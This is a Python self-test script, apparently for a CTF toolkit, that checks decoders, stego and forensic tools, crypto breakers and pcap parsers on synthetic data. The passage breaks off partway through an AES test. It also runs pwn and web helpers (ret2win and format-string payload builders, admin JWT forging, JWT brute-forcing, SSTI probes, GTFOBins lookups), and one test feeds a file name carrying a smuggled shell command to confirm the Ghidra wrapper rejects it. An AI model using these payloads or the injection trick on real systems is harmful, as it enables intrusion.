#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
selftest.py — проверка, что все скрипты кита живы и делают то, что обещают.
Запуск:  python tests/selftest.py
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import io
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import zipfile
import atexit
import base64
import hashlib
import hmac
import io
import json
import math
import plistlib
import tarfile
import wave

from PIL import Image

KIT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = sys.executable
ENV = dict(os.environ, PYTHONIOENCODING="utf-8")

passed, failed = 0, 0


def run(rel_script, *args, env=None):
    path = os.path.join(KIT, rel_script)
    e = dict(ENV)
    if env:
        e.update(env)
    return subprocess.run([PY, path, *map(str, args)], capture_output=True, text=True,
                          encoding="utf-8", errors="replace", env=e)


def check(name, cond, detail=""):
    global passed, failed
    if cond:
        passed += 1
        print(f"[PASS] {name}")
    else:
        failed += 1
        print(f"[FAIL] {name}")
        if detail:
            print("       " + detail.replace("\n", "\n       ")[:1200])


def write_png_with_lsb(path, message: bytes):
    w, h = 240, 30
    im = Image.new("RGB", (w, h), (128, 0, 0))
    px = im.load()
    bits = [(b >> (7 - i)) & 1 for b in message for i in range(8)]
    idx = 0
    for y in range(h):
        for x in range(w):
            if idx >= len(bits):
                break
            r, g, b = px[x, y]
            px[x, y] = ((r & 0xFE) | bits[idx], g, b)
            idx += 1
    im.save(path)


def write_alpha_png(path, message: bytes):
    w, h = 240, 30
    im = Image.new("RGBA", (w, h), (10, 20, 30, 255))
    px = im.load()
    for i, b in enumerate(message):
        x, y = i % w, i // w
        px[x, y] = (10, 20, 30, b)
    im.save(path)


def make_zip_bytes(name="a.txt", data=b"hello", comment=b""):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(name, data)
        if comment:
            z.comment = comment
    return buf.getvalue()


def checks_reverse(tmp):
    """Регрессии reverse/*: ghidra_decomp, disasm, megarev, lang_info, py_pack, xor_scan."""
    import time
    # #51 ghidra_decomp: имя файла не попадает в cmd.exe (поддельный analyzeHeadless.bat)
    if os.name == "nt":
        fake = os.path.join(tmp, "fake_ghidra")
        os.makedirs(fake, exist_ok=True)
        with open(os.path.join(fake, "analyzeHeadless.bat"), "w", newline="\r\n") as f:
            f.write("@echo off\necho /* ==== fake_func @ 0 */\necho ARGS: %*\n")
        inj_dir = os.path.join(tmp, "inj51")
        os.makedirs(inj_dir, exist_ok=True)
        inj = os.path.join(inj_dir, "a&echo.INJMARK51&.bin")  # без пробелов: не в кавычках
        open(inj, "wb").write(b"MZ" + b"\x00" * 62)
        r = run("reverse/ghidra_decomp.py", inj, env={"GHIDRA_HOME": fake})
        lines = [ln.strip() for ln in r.stdout.splitlines()]
        args_line = next((ln for ln in lines if ln.startswith("ARGS:")), "")
        check("ghidra_decomp: имя файла не уходит в cmd.exe",
              "fake_func" in r.stdout and "INJMARK51" not in lines
              and "input_" in args_line and "a&" not in args_line,
              r.stdout[-800:] + r.stderr)

        # #79 --keep-project оставляет проект и печатает путь
        okbin = os.path.join(inj_dir, "ok.bin")
        open(okbin, "wb").write(b"MZ" + b"\x00" * 62)
        r = run("reverse/ghidra_decomp.py", okbin, "--keep-project", env={"GHIDRA_HOME": fake})
        kept = [ln.rsplit(": ", 1)[-1].strip() for ln in r.stdout.splitlines()
                if ln.startswith("[+]") and "ghidra_proj_" in ln]
        check("ghidra_decomp --keep-project",
              bool(kept) and os.path.isdir(kept[0]), r.stdout[-800:] + r.stderr)
        for d in kept:
            if "ghidra_proj_" in os.path.basename(d):
                shutil.rmtree(d, True)

        # #79 --timeout гасит всё дерево (bat -> ping), а не ждёт его конца
        slow = os.path.join(tmp, "fake_ghidra_slow")
        os.makedirs(slow, exist_ok=True)
        with open(os.path.join(slow, "analyzeHeadless.bat"), "w", newline="\r\n") as f:
            f.write("@echo off\necho started\nping -n 20 127.0.0.1 >nul\n"
                    "echo /* ==== late @ 0 */\n")
        t0 = time.time()
        r = run("reverse/ghidra_decomp.py", okbin, "--timeout", "2", env={"GHIDRA_HOME": slow})
        took = time.time() - t0
        check("ghidra_decomp --timeout kills tree",
              took < 10 and "late" not in r.stdout, f"{took:.1f}s\n" + r.stdout[-600:] + r.stderr)
    else:
        print("[SKIP] ghidra_decomp cmd.exe: только Windows")


def main():
    tmp = tempfile.mkdtemp(prefix="ctfkit_")
    atexit.register(shutil.rmtree, tmp, True)
    print("temp:", tmp)

    # 1. enc
    r = run("enc.py", "Q1RGe2ZsYWd9")
    check("enc.py base64", "CTF{flag}" in r.stdout, r.stdout + r.stderr)

    # 3b. enc: rot47, математические буквы (NFKC), восьмеричные коды
    rot = "".join(chr(33 + ((ord(c) - 33 + 47) % 94)) if 33 <= ord(c) <= 126 else c
                  for c in "CTF{rot47}")
    r = run("enc.py", rot)
    check("enc.py rot47", "CTF{rot47}" in r.stdout, r.stdout + r.stderr)
    r = run("enc.py", "ＣＴＦ{ｆａｎｃｙ}")
    check("enc.py nfkc", "CTF{fancy}" in r.stdout, r.stdout + r.stderr)
    oct_s = " ".join(oct(ord(c))[2:] for c in "CTF{octal}")
    r = run("enc.py", oct_s)
    check("enc.py octal", "CTF{octal}" in r.stdout, r.stdout + r.stderr)
    a85 = base64.a85encode(b"CTF{ascii85}").decode()
    r = run("enc.py", a85)
    check("enc.py ascii85", "CTF{ascii85}" in r.stdout, r.stdout + r.stderr)
    r = run("enc.py", "PGS{ebg63}")
    check("enc.py rot18", "CTF{rot18}" in r.stdout, r.stdout + r.stderr)
    r = run("enc.py", "=?UTF-8?B?Q1RGe21pbWV9?=")
    check("enc.py mime", "CTF{mime}" in r.stdout, r.stdout + r.stderr)

    # 3c. enc: кодеки (utf-16/32, cp1251) и редкие base (36, z85)
    for label, blob, want in (
        ("utf16", "CTF{utf16}".encode("utf-16-le"), "CTF{utf16}"),
        ("utf32", "CTF{utf32}".encode("utf-32-le"), "CTF{utf32}"),
        ("cp1251", "Привет CTF{cyr}".encode("cp1251"), "CTF{cyr}"),
    ):
        cp = os.path.join(tmp, f"enc_{label}.bin")
        with open(cp, "wb") as f:
            f.write(blob)
        r = run("enc.py", "--file", cp)
        check(f"enc.py {label}", want in r.stdout, r.stdout[:600] + r.stderr)

    _v = int.from_bytes(b"CTF{b36}", "big")
    _b36 = ""
    while _v:
        _v, _r = divmod(_v, 36)
        _b36 = "0123456789abcdefghijklmnopqrstuvwxyz"[_r] + _b36
    r = run("enc.py", _b36)
    check("enc.py base36", "CTF{b36}" in r.stdout, r.stdout[:600] + r.stderr)

    _z85a = ("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
             ".-:+=^!/*?&<>()[]{}@%$#")
    _raw = b"CTF{z85}"
    _raw += b"\x00" * (-len(_raw) % 4)
    _z85 = ""
    for _i in range(0, len(_raw), 4):
        _val = int.from_bytes(_raw[_i:_i + 4], "big")
        _part = ""
        for _ in range(5):
            _val, _rem = divmod(_val, 85)
            _part = _z85a[_rem] + _part
        _z85 += _part
    r = run("enc.py", _z85)
    check("enc.py z85", "CTF{z85}" in r.stdout, r.stdout[:600] + r.stderr)

    _b92a = ("!#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "[\\]^_abcdefghijklmnopqrstuvwxyz{|}")
    _bits = "".join(f"{b:08b}" for b in b"CTF{base92}")
    _bits += "0" * (-len(_bits) % 13)
    _b92 = ""
    for _i in range(0, len(_bits), 13):
        _val = int(_bits[_i:_i + 13], 2)
        _b92 += _b92a[_val // 91] + _b92a[_val % 91]
    r = run("enc.py", _b92)
    check("enc.py base92", "CTF{base92}" in r.stdout, r.stdout[:600] + r.stderr)

    _b100 = "".join(chr(0x1F3F7 + b) for b in b"CTF{base100}")
    r = run("enc.py", _b100)
    check("enc.py base100", "CTF{base100}" in r.stdout, r.stdout[:600] + r.stderr)

    # 2. runs
    p = os.path.join(tmp, "runs.txt")
    open(p, "w").write("<" * 67 + ">" * 84 + "{" * 123)
    r = run("stego/runs.py", p)
    check("stego/runs.py", "CT{" in r.stdout, r.stdout + r.stderr)

    # 3. genetic
    r = run("crypto/genetic.py", "UGUACUUUC")
    check("crypto/genetic.py", "CTF" in r.stdout, r.stdout + r.stderr)

    # 4. xor_known
    key = b"aB!12"
    plain = b"This is my message: hello CTF{xor}"
    ct = bytes(c ^ key[i % len(key)] for i, c in enumerate(plain)).hex()
    r = run("crypto/xor_known.py", "--hex", ct, "--known", "This is my message: ", "--keylen", "5")
    check("crypto/xor_known.py", "CTF{xor}" in r.stdout and "aB!12" in r.stdout, r.stdout + r.stderr)

    # 4b. xor_known: длина ключа подбирается сама
    r = run("crypto/xor_known.py", "--hex", ct, "--known", "This is my message: ")
    check("crypto/xor_known.py auto-keylen",
          "CTF{xor}" in r.stdout and "aB!12" in r.stdout, r.stdout + r.stderr)

    # 4c. known-текст задан в нижнем регистре, а флаг — в верхнем
    ck = b"K3y!"
    cplain = b"CTF{case_known}"
    cct = bytes(c ^ ck[i % len(ck)] for i, c in enumerate(cplain)).hex()
    r = run("crypto/xor_known.py", "--hex", cct, "--known", "ctf{")
    check("crypto/xor_known.py case", "CTF{case_known}" in r.stdout, r.stdout + r.stderr)

    # 5. caesar
    src = "The quick brown fox jumps over the lazy dog"
    cipher = "".join(chr((ord(c) - 97 + 3) % 26 + 97) if "a" <= c <= "z" else c for c in src.lower())
    r = run("crypto/classical.py", "caesar", "--text", cipher, "--key", "3")
    check("crypto/classical.py caesar", "quick brown" in r.stdout, r.stdout + r.stderr)
    r = run("crypto/classical.py", "multitap", "--text", "222 33 555 666")
    check("crypto/classical.py multitap", r.stdout.strip() == "celo", r.stdout)

    # 6. jwt
    r = run("web/jwt_tool.py", "forge", "--secret", "s3cr3t", "--sub", "admin", "--role", "admin")
    token = r.stdout.splitlines()[0].strip() if r.stdout else ""
    r2 = run("web/jwt_tool.py", "verify", "--secret", "s3cr3t", token)
    check("web/jwt_tool.py forge/verify", token.count(".") == 2 and "OK" in r2.stdout,
          r.stdout + r.stderr + r2.stdout)

    # 7. lsb
    msg = b"CTF{lsb_works}"
    p = os.path.join(tmp, "lsb.png")
    write_png_with_lsb(p, msg)
    r = run("stego/lsb.py", p, "--channel", "r")
    check("stego/lsb.py", "CTF{lsb_works}" in r.stdout, r.stdout[-800:] + r.stderr)

    # 8. alpha
    p = os.path.join(tmp, "alpha.png")
    write_alpha_png(p, b"CTF{alpha}")
    r = run("stego/alpha.py", p)
    check("stego/alpha.py", "CTF{alpha}" in r.stdout, r.stdout[-800:] + r.stderr)

    # 8b. png_chunks: битый CRC и --fix
    import zlib as _zl

    def _png_chunk(t, d):
        return (struct.pack(">I", len(d)) + t + d
                + struct.pack(">I", _zl.crc32(t + d) & 0xFFFFFFFF))

    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    idat = _zl.compress(b"\x00\xff\x00\x00")
    txt = b"Comment\x00" + b"note CTF{png_crc} " + b"x" * 12
    raw = (sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"tEXt", txt)
           + _png_chunk(b"IDAT", idat) + _png_chunk(b"IEND", b""))
    bad = bytearray(raw)
    bad[raw.index(b"CTF{png_crc}") + 4] ^= 0x20
    bp = os.path.join(tmp, "bad_crc.png")
    with open(bp, "wb") as f:
        f.write(bad)
    r = run("stego/png_chunks.py", bp)
    check("stego/png_chunks.py crc",
          "CRC" in r.stdout and "битым" in r.stdout, r.stdout + r.stderr)
    fp = os.path.join(tmp, "fixed_crc.png")
    run("stego/png_chunks.py", bp, "--fix", fp)
    r = run("stego/png_chunks.py", fp)
    check("stego/png_chunks.py fix",
          "CRC у всех чанков совпадает" in r.stdout, r.stdout + r.stderr)

    # 9. jpeg_tail
    p = os.path.join(tmp, "pic.jpg")
    Image.new("RGB", (20, 20), (200, 100, 50)).save(p, "JPEG")
    with open(p, "ab") as f:
        f.write(make_zip_bytes("hidden.txt", b"CTF{tail}"))
    r = run("stego/jpeg_tail.py", p)
    check("stego/jpeg_tail.py", ".zip" in r.stdout, r.stdout + r.stderr)

    # 10. carve
    p = os.path.join(tmp, "carve.png")
    write_png_with_lsb(p, b"x")
    with open(p, "ab") as f:
        f.write(make_zip_bytes("inside.txt", b"CTF{carve}"))
    out = os.path.join(tmp, "carved")
    r = run("stego/carve.py", p, "--out", out)
    files = os.listdir(out) if os.path.isdir(out) else []
    check("stego/carve.py", any(f.endswith(".zip") for f in files), r.stdout + r.stderr)

    # 11. zipmeta
    p = os.path.join(tmp, "c.zip")
    open(p, "wb").write(make_zip_bytes(comment=b"CTF{zip_comment}"))
    r = run("forensic/zipmeta.py", p)
    check("forensic/zipmeta.py", "CTF{zip_comment}" in r.stdout, r.stdout + r.stderr)

    # 12. hash_id
    r = run("crypto/hash_id.py", "5f4dcc3b5aa765d61d8327deb882cf99")
    check("crypto/hash_id.py", "MD5" in r.stdout, r.stdout + r.stderr)

    # 13. ret2win payload
    r = run("pwn/ret2win.py", "payload", "--offset", "8", "--addr", "0x401000")
    check("pwn/ret2win.py", "41414141" in r.stdout and "0010400000000000" in r.stdout,
          r.stdout + r.stderr)

    # 14. triage
    p = os.path.join(tmp, "note.txt")
    open(p, "w").write("hello CTF{triage} world")
    r = run("triage.py", p)
    check("triage.py", "CTF{triage}" in r.stdout, r.stdout + r.stderr)

    # 15. ooxml
    p = os.path.join(tmp, "doc.docx")
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("word/document.xml", "<xml/>")
        z.writestr("word/media/image1.jpg", b"\xff\xd8 JFIF CTF{ooxml} \xff\xd9")
    r = run("stego/ooxml.py", p, "--extract", os.path.join(tmp, "docx_out"))
    check("stego/ooxml.py", "CTF{ooxml}" in r.stdout, r.stdout + r.stderr)

    # 16. timeconv
    r = run("misc/timeconv.py", "--ts", "0")
    check("misc/timeconv.py", "1970-01-01" in r.stdout, r.stdout + r.stderr)

    # 17. aes_file
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    key_str, iv_str, xorv = "SECRETKEY", "IV12345678901234", 42
    key = bytes((ord(c) ^ xorv) & 0xFF for c in key_str)
    key = (key * ((32 // len(key)) + 1))[:32]
    iv = iv_str.encode()[:16]
    plaintext = b"CTF{aes_ok}"
    enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))
    p = os.path.join(tmp, "secret.enc")
    open(p, "wb").write(enc)
    r = run("crypto/aes_file.py", p, "--key", key_str, "--key-xor", str(xorv),
            "--keylen", "32", "--iv", iv_str)
    check("crypto/aes_file.py", "CTF{aes_ok}" in r.stdout, r.stdout + r.stderr)

    # 18. pcap
    try:
        from scapy.all import Ether, IP, TCP, Raw, wrpcap
        p = os.path.join(tmp, "cap.pcap")
        pkt = Ether() / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(dport=80) / Raw(
            load=b"GET / HTTP/1.1\r\nHost: x\r\n\r\nCTF{pcap}")
        wrpcap(p, [pkt])
        r = run("network/pcap_report.py", p)
        check("network/pcap_report.py", "CTF{pcap}" in r.stdout, r.stdout + r.stderr)
    except Exception as e:
        check("network/pcap_report.py", False, f"scapy error: {e}")

    # 19. RSA shared factor
    p, q1, q2 = 1000003, 1000033, 1000037
    n1, n2 = p * q1, p * q2
    e, m = 65537, 123456789
    c = pow(m, e, n1)
    mod = os.path.join(tmp, "mod.txt")
    open(mod, "w").write(f"target:{n1}\nother:{n2}\n")
    r = run("crypto/rsa_tool.py", "shared", "--moduli", mod, "--target", "target",
            "--e", str(e), "--cipher", str(c))
    check("crypto/rsa_tool.py shared", str(m) in r.stdout, r.stdout + r.stderr)

    # 20. stream_sha256
    import hashlib
    key = bytes(range(16))
    nonce = bytes(range(12))
    pt = b"hello CTF{stream_ok}"
    ks = b"".join(hashlib.sha256(key + nonce + i.to_bytes(4, "big")).digest()
                  for i in range(10))[:len(pt)]
    ct = bytes(a ^ b for a, b in zip(pt, ks))
    r = run("crypto/stream_sha256.py", "--cipher", ct.hex(),
            "--key", key.hex(), "--nonce", nonce.hex())
    check("crypto/stream_sha256.py", "CTF{stream_ok}" in r.stdout, r.stdout + r.stderr)

    # 21. bitmap_font
    rows = [".####", "#....", "#....", "#....", ".####"]
    csvp = os.path.join(tmp, "glyph.csv")
    with open(csvp, "w") as f:
        f.write("x,y\n")
        for y, row in enumerate(rows):
            for x, ch in enumerate(row):
                if ch == "#":
                    f.write(f"{x},{y}\n")
    r = run("stego/bitmap_font.py", csvp, "--decode")
    check("stego/bitmap_font.py", "decode: C" in r.stdout, r.stdout + r.stderr)

    # 22. gtfobins
    r = run("linux/gtfobins.py", "--check", "find,base64")
    check("linux/gtfobins.py", "-exec" in r.stdout and "base64" in r.stdout, r.stdout + r.stderr)

    # 23. artifact_hunt
    d = os.path.join(tmp, "dump")
    os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "app-log.txt"), "w").write(
        "APP_SECRET=6b4b586445b26b98863d9e054281243f\nCTF{from_log}\n")
    with zipfile.ZipFile(os.path.join(d, "b.zip"), "w") as z:
        z.writestr("settings_secure.xml", "<x android_id='0123456789abcdef'/>")
    r = run("forensic/artifact_hunt.py", d, "--zip")
    check("forensic/artifact_hunt.py", "CTF{from_log}" in r.stdout and "android_id" in r.stdout,
          r.stdout + r.stderr)

    # 24. script_audit
    cfg = os.path.join(tmp, "runtime.conf")
    open(cfg, "w").write("X=1\n")
    sc = os.path.join(tmp, "reconcile.sh")
    open(sc, "w").write("#!/bin/bash\nsource " + cfg + "\ncat /etc/hostname\n")
    r = run("linux/script_audit.py", sc, "--check-writable")
    check("linux/script_audit.py", "runtime.conf" in r.stdout and "WRITABLE" in r.stdout,
          r.stdout + r.stderr)

    # 24b. wsl.py: справка и регистрация в диспетчере (без запуска WSL)
    r = run("linux/wsl.py", "--help")
    check("linux/wsl.py help", "run" in r.stdout and "info" in r.stdout,
          r.stdout + r.stderr)
    r = run("toolbox.py", "index")
    check("toolbox.py index wsl", "wsl" in r.stdout and "ELF" in r.stdout,
          r.stdout[:800] + r.stderr)

    # 25. volatility_text
    envp = os.path.join(tmp, "envars.txt")
    open(envp, "w").write("PID 4172 agent.exe\nAPP_SECRET=6b4b5864\nAPP_ROLE=test\n")
    r = run("forensic/volatility_text.py", envp, "--name", "agent")
    check("forensic/volatility_text.py", "APP_SECRET" in r.stdout, r.stdout + r.stderr)

    # 26. udp_payloads
    try:
        from scapy.all import Ether, UDP as SUDP, wrpcap as wr
        up = os.path.join(tmp, "u.pcap")
        wr(up, [Ether() / IP(src="1.1.1.1", dst="2.2.2.2") / SUDP(sport=1000, dport=2000)
                / Raw(load=b"MOBILE/u1/aa11/CTF{udp}")])
        r = run("network/udp_payloads.py", up, "--sep", "/")
        check("network/udp_payloads.py", "CTF{udp}" in r.stdout, r.stdout + r.stderr)
    except Exception as e:
        check("network/udp_payloads.py", False, f"scapy error: {e}")

    # 27. classical: vigenere-crack
    plain = ("the quick brown fox jumps over the lazy dog and then runs away "
             "into the forest where nobody can find him ") * 4
    vkey = "LEMON"
    cipher = ""
    j = 0
    for ch in plain:
        if ch.isalpha():
            k = ord(vkey[j % len(vkey)]) - 65
            cipher += chr((ord(ch.lower()) - 97 + k) % 26 + 97)
            j += 1
        else:
            cipher += ch
    r = run("crypto/classical.py", "vigenere-crack", "--text", cipher)
    check("crypto/classical.py vigenere-crack", "key=LEMON" in r.stdout, r.stdout[:400])

    # 28. rsa fermat + batch
    r = run("crypto/rsa_tool.py", "fermat", "--n", str(n1))
    check("crypto/rsa_tool.py fermat", str(p) in r.stdout or str(q1) in r.stdout,
          r.stdout + r.stderr)
    mod2 = os.path.join(tmp, "mods2.txt")
    open(mod2, "w").write(f"a:{p * 7}\nb:{p * 11}\nc:{q1 * 13}\n")
    r = run("crypto/rsa_tool.py", "batch", "--moduli", mod2)
    check("crypto/rsa_tool.py batch", "a <-> b" in r.stdout, r.stdout + r.stderr)

    # 29. otp_reuse
    p1 = b"the secret message is CTF{otp}"
    p2 = b"another plaintext without flag"
    kk = bytes((i * 37 + 11) & 0xFF for i in range(max(len(p1), len(p2))))
    c1 = bytes(a ^ b for a, b in zip(p1, kk))
    c2 = bytes(a ^ b for a, b in zip(p2, kk))
    r = run("crypto/otp_reuse.py", "--c1", c1.hex(), "--c2", c2.hex(), "--crib", "the ")
    check("crypto/otp_reuse.py", "anot" in r.stdout, r.stdout[:400])

    # 30. png_chunks
    png = os.path.join(tmp, "txt.png")
    from PIL.PngImagePlugin import PngInfo
    info = PngInfo()
    info.add_text("Comment", "CTF{png_text}")
    Image.new("RGB", (8, 8), (1, 2, 3)).save(png, pnginfo=info)
    r = run("stego/png_chunks.py", png)
    check("stego/png_chunks.py", "CTF{png_text}" in r.stdout, r.stdout + r.stderr)

    # 31. android_backup
    import sqlite3
    ad = os.path.join(tmp, "android")
    os.makedirs(ad, exist_ok=True)
    open(os.path.join(ad, "settings_secure.xml"), "w").write(
        '<settings><setting name="android_id" value="0123456789abcdef"/></settings>')
    open(os.path.join(ad, "device.xml"), "w").write('<device seed="test-seed-value"/>')
    open(os.path.join(ad, "app-log.txt"), "w").write("upload key = abc\nCTF{android}\n")
    con = sqlite3.connect(os.path.join(ad, "messages.db"))
    con.execute("create table msg(id int, body text)")
    con.execute("insert into msg values(1,'hi')")
    con.commit()
    con.close()
    r = run("forensic/android_backup.py", ad)
    check("forensic/android_backup.py",
          "android_id" in r.stdout and "seed" in r.stdout and "messages" in r.stdout,
          r.stdout + r.stderr)

    # 32. dns_tunnel
    try:
        from scapy.all import DNS, DNSQR, UDP as DUDP
        dp = os.path.join(tmp, "d.pcap")
        pkts = [Ether() / IP(src="1.1.1.1", dst="8.8.8.8") / DUDP(dport=53)
                / DNS(rd=1, qd=DNSQR(qname=x + ".exfil.test"))
                for x in ["68656c6c6f", "776f726c64"]]
        wrpcap(dp, pkts)
        r = run("network/dns_tunnel.py", dp, "--domain", "exfil.test")
        check("network/dns_tunnel.py", "helloworld" in r.stdout, r.stdout + r.stderr)
        # без --domain: канал должен найтись сам среди обычных имён
        pkts += [Ether() / IP(src="1.1.1.1", dst="8.8.8.8") / DUDP(dport=53)
                 / DNS(rd=1, qd=DNSQR(qname=x + ".office.test"))
                 for x in ["portal", "mail", "cdn"]]
        dp2 = os.path.join(tmp, "d2.pcap")
        wrpcap(dp2, pkts)
        r = run("network/dns_tunnel.py", dp2)
        check("network/dns_tunnel.py auto-domain",
              "helloworld" in r.stdout and "exfil" in r.stdout, r.stdout + r.stderr)

        # структурированный канал: <session>.<index>.<hex>, порядок в pcap перемешан
        import hashlib as _hl
        import random as _rnd
        import zlib as _zl
        plain = b"CTF{dns_indexed_long_flag}"
        enc = plain.hex()
        chunks = [enc[i:i + 16] for i in range(0, len(enc), 16)]
        order = list(range(len(chunks)))
        _rnd.Random(7).shuffle(order)
        dp3 = os.path.join(tmp, "d3.pcap")
        wrpcap(dp3, [Ether() / IP(src="10.0.0.5", dst="8.8.8.8") / DUDP(dport=53)
                     / DNS(rd=1, qd=DNSQR(qname=f"aa11.{i:03d}.{chunks[i]}.sink.t3.test"))
                     for i in order])
        r = run("network/dns_tunnel.py", dp3)
        check("network/dns_tunnel.py indexed",
              "CTF{dns_indexed_long_flag}" in r.stdout, r.stdout + r.stderr)

        # ключ не задан флагом: seed/host берутся из environ.bin рядом с pcap
        blob = _zl.compress(b'{"flag": "CTF{dns_env_key}"}', 9)
        key = _hl.sha256(b"seed-42:node-7").digest()
        enc = bytes(v ^ key[i % len(key)] for i, v in enumerate(blob)).hex()
        chunks = [enc[i:i + 20] for i in range(0, len(enc), 20)]
        order = list(range(len(chunks)))
        _rnd.Random(11).shuffle(order)
        dp4 = os.path.join(tmp, "d4.pcap")
        wrpcap(dp4, [Ether() / IP(src="10.0.0.6", dst="8.8.8.8") / DUDP(dport=53)
                     / DNS(rd=1, qd=DNSQR(qname=f"bb22.{i:03d}.{chunks[i]}.sink.t4.test"))
                     for i in order])
        with open(os.path.join(tmp, "environ.bin"), "wb") as f:
            f.write(b"USER=x\x00SYNC_SEED=seed-42\x00HOSTNAME=node-7\x00")
        r = run("network/dns_tunnel.py", dp4)
        check("network/dns_tunnel.py env-key",
              "CTF{dns_env_key}" in r.stdout, r.stdout + r.stderr)
    except Exception as e:
        check("network/dns_tunnel.py", False, f"scapy error: {e}")

    # 33. pcap_http
    try:
        hp = os.path.join(tmp, "h.pcap")
        req = (Ether() / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=1234, dport=80, seq=1)
               / Raw(load=b"GET /x HTTP/1.1\r\nHost: a\r\n\r\n"))
        resp = (Ether() / IP(src="10.0.0.2", dst="10.0.0.1") / TCP(sport=80, dport=1234, seq=1)
                / Raw(load=b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\nContent-Type: text/plain\r\n\r\nCTF{http}"))
        wrpcap(hp, [req, resp])
        out = os.path.join(tmp, "objs")
        r = run("network/pcap_http.py", hp, "--out", out)
        check("network/pcap_http.py", "GET /x" in r.stdout and "CTF{http}" in r.stdout,
              r.stdout + r.stderr)
    except Exception as e:
        check("network/pcap_http.py", False, f"scapy error: {e}")

    # 34. checksec (PE)
    r = run("pwn/checksec.py", PY)
    check("pwn/checksec.py", "PE" in r.stdout and "ASLR" in r.stdout, r.stdout + r.stderr)

    # 35. fmtstr
    r = run("pwn/fmtstr.py", "find", "--count", "10")
    check("pwn/fmtstr.py find", "%7$p" in r.stdout, r.stdout + r.stderr)
    r = run("pwn/fmtstr.py", "write", "--addr", "0x404060", "--value", "0x1337", "--index", "10")
    check("pwn/fmtstr.py write", "python:" in r.stdout and "hex:" in r.stdout,
          r.stdout + r.stderr)

    # 36. strings_filter
    binp = os.path.join(tmp, "bin.dat")
    open(binp, "wb").write(b"\x00CTF{strings}\x00password=abc\x00")
    r = run("reverse/strings_filter.py", binp, "--flag")
    check("reverse/strings_filter.py", "CTF{strings}" in r.stdout, r.stdout + r.stderr)

    # 37. xor_scan
    plain_x = b"the secret message is CTF{xor_scan} and more text here"
    open(os.path.join(tmp, "xor.bin"), "wb").write(bytes(c ^ 0x5A for c in plain_x))
    r = run("reverse/xor_scan.py", os.path.join(tmp, "xor.bin"))
    check("reverse/xor_scan.py", "CTF{xor_scan}" in r.stdout, r.stdout[:500] + r.stderr)

    # 38. py_pack
    open(os.path.join(tmp, "packed.bin"), "wb").write(b"junk pyarmor_runtime junk")
    r = run("reverse/py_pack.py", os.path.join(tmp, "packed.bin"))
    check("reverse/py_pack.py", "pyarmor" in r.stdout, r.stdout + r.stderr)

    # 39. jwt_brute
    hh = base64.urlsafe_b64encode(json.dumps(
        {"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode()).rstrip(b"=").decode()
    pp = base64.urlsafe_b64encode(json.dumps(
        {"sub": "user"}, separators=(",", ":")).encode()).rstrip(b"=").decode()
    sig = base64.urlsafe_b64encode(
        hmac.new(b"secret", f"{hh}.{pp}".encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    r = run("web/jwt_brute.py", f"{hh}.{pp}.{sig}")
    check("web/jwt_brute.py", "СЕКРЕТ" in r.stdout and "secret" in r.stdout,
          r.stdout[-300:] + r.stderr)

    # 40. ssti_probe --list
    r = run("web/ssti_probe.py", "--list")
    check("web/ssti_probe.py", "{{7*7}}" in r.stdout, r.stdout + r.stderr)

    # 41. pcap_creds
    cp = os.path.join(tmp, "creds.pcap")
    pk1 = (Ether() / IP(src="1.1.1.1", dst="2.2.2.2") / TCP(sport=1234, dport=80)
           / Raw(load=b"GET / HTTP/1.1\r\nAuthorization: Basic dXNlcjpwYXNz\r\n\r\n"))
    pk2 = (Ether() / IP(src="1.1.1.1", dst="2.2.2.2") / TCP(sport=1235, dport=21)
           / Raw(load=b"USER bob\r\nPASS hunter2\r\n"))
    wrpcap(cp, [pk1, pk2])
    r = run("network/pcap_creds.py", cp)
    check("network/pcap_creds.py", "user:pass" in r.stdout and "hunter2" in r.stdout,
          r.stdout + r.stderr)

    # 42. audio_spectrum
    wavp = os.path.join(tmp, "a.wav")
    with wave.open(wavp, "w") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(22050)
        w.writeframes(b"".join(
            struct.pack("<h", int(8000 * math.sin(2 * math.pi * 440 * i / 22050)))
            for i in range(22050)))
    spec = os.path.join(tmp, "spec.png")
    r = run("stego/audio_spectrum.py", wavp, "--out", spec)
    check("stego/audio_spectrum.py", os.path.exists(spec), r.stdout + r.stderr)

    # 43. qr_scan
    try:
        import cv2
        qrp = os.path.join(tmp, "qr.png")
        enc = cv2.QRCodeEncoder_create()
        img = enc.encode("CTF{qr_ok}")
        if isinstance(img, tuple):
            img = img[0]
        cv2.imwrite(qrp, img)
        r = run("stego/qr_scan.py", qrp)
        check("stego/qr_scan.py", "CTF{qr_ok}" in r.stdout, r.stdout + r.stderr)
    except Exception as e:
        check("stego/qr_scan.py", False, f"cv2 error: {e}")

    # 44. apk_info
    apkp = os.path.join(tmp, "app.apk")
    with zipfile.ZipFile(apkp, "w") as z:
        z.writestr("AndroidManifest.xml", "com.example.app".encode("utf-16le"))
        z.writestr("classes.dex", b"\x00junk http://api.example/x CTF{apk}")
    r = run("forensic/apk_info.py", apkp)
    check("forensic/apk_info.py", "com.example.app" in r.stdout and "CTF{apk}" in r.stdout,
          r.stdout + r.stderr)

    # 45. aes_ecb
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad as _pad
    key = b"0123456789abcdef"
